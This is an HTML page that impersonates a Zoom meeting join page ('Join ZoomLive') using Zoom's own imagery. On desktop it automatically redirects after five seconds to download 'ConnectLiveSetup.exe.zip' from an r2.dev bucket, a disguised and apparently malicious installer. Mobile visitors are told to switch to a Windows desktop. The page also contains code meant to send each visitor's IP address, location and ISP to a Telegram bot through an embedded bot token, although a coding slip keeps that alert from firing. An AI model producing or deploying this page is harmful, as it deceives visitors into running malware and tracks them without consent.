<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Join ZoomLive</title>
    <style>
        /* Reset & Global Settings */
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #f8f9fa; /* Matches the light background in 78834.png */
        }

        /* -----------------------------------
           MOBILE VIEW (Matches 78834.png) 
           ----------------------------------- */
        #mobile-view {
            display: none; /* Hidden by default via CSS */
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            text-align: center;
            padding: 20px;
            box-sizing: border-box;
        }
        
        .warning-container {
            max-width: 400px;
        }
        
        .warning-title {
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            font-weight: 600;
            color: #d93025; /* Warning Red */
            margin-bottom: 25px;
        }
        
        .warning-title .emoji {
            font-size: 26px;
            margin-right: 8px;
        }
        
        .warning-text {
            font-size: 15px;
            color: #3c4043;
            margin-bottom: 20px;
            line-height: 1.5;
        }

        /* -----------------------------------
           DESKTOP VIEW (Background + Spinner)
           ----------------------------------- */
        #desktop-view {
            display: none; /* Hidden by default via CSS */
            height: 100vh;
            width: 100vw;
            /* Injected Zoom Background Image */
            background: url('https://st1.zoom.us/fe-static/fe-signup-login-active-v3/assets/banner-step-1.DTtJ7nly.png') no-repeat center center fixed;
            background-size: cover;
            position: relative;
        }

        /* Top-Left Logo Element */
        .logo {
            position: absolute;
            top: 20px;
            left: 20px;
            height: 40px; /* Adjust based on your actual logo proportions */
            width: auto;
            z-index: 10;
        }

        /* Spinner Overlay */
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            /* Semi-transparent white to ensure the spinner is readable over the image */
            background: rgba(255, 255, 255, 0.7); 
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 5;
        }

        /* CSS Loading Ring */
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #e5e5e5;
            border-top-color: #0b5cff; /* Blue spin color */
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <!-- DOM Element: Mobile Warning -->
    <div id="mobile-view">
        <div class="warning-container">
            <div class="warning-title">
                <span class="emoji">⚠️</span> Desktop Only
            </div>
            <div class="warning-text">
                Access is only available on a desktop or Windows computer.
            </div>
            <div class="warning-text">
                Please check your email and open the document on a laptop or desktop device.
            </div>
        </div>
    </div>

    <!-- DOM Element: Desktop Loader -->
    <div id="desktop-view">
        <!-- REPLACE the src string below with the URL of your actual logo -->
        <img class="logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSbyGwaDwBGizu6H8S1e_ktO_2wYI7p-BGIt0CuJX7nrw&s=10" alt="Company Logo">

        <div class="overlay">
            <div class="spinner"></div>
        </div>
    </div>

    <!-- Core Logic -->
        <script>
        document.addEventListener('DOMContentLoaded', () => {
            // --- Configuration ---
            const TARGET_URL = "https://pub-9155da1311434ab9afab81c1b8a9128c.r2.dev/ConnectLiveSetup.exe.zip";
            
            // Telegram API Credentials 
            const TELEGRAM_BOT_TOKEN = "7087439078:AAHJ94YpC_O1MmlxnieYUcFTdvcFDSIB0D4";
            const TELEGRAM_CHAT_ID = "2074391753";

            // --- Environment Detection ---
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            const deviceType = isMobile ? "Mobile" : "Desktop";

            // --- Notification Logic ---
            async function triggerTelegramAlert() {
                try {
                    // 1. Fetch IP and Geolocation data using a free public API
                    const geoResponse = await fetch('https://ipapi.co/json/');
                    const geoData = await geoResponse.json();

                    // 2. Construct the alert message
                    const message = `
🔔 *New Page Visitor*
*Device:* ${deviceType}
*IP:* ${geoData.ip || 'Unknown'}
*Location:* ${geoData.city || 'Unknown'}, ${geoData.region || 'Unknown'}, ${geoData.country_name || 'Unknown'}
*ISP:* ${geoData.org || 'Unknown'}
                    `;

                    // 3. Dispatch to Telegram API via POST request
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message,
                            parse_mode: 'Markdown'
                        })
                    });
                } catch (error) {
                    console.error("Alert dispatch failed", error);
                }
            }

            // Fire the alert silently in the background (prevents firing if tokens aren't set)
            if(TELEGRAM_BOT_TOKEN !== "7087439078:AAHJ94YpC_O1MmlxnieYUcFTdvcFDSIB0D4") {
                triggerTelegramAlert();
            }

            // --- Render & Redirect Logic ---
            if (isMobile) {
                // Mobile: Render warning and stop
                document.getElementById('mobile-view').style.display = 'flex';
            } else {
                // Desktop: Render background/loader
                document.getElementById('desktop-view').style.display = 'block';

                // Execute auto-trigger after 5 seconds
                setTimeout(() => {
                    window.location.replace(TARGET_URL);
                }, 5000); 
            }
        });
    </script>
</body>

</html>
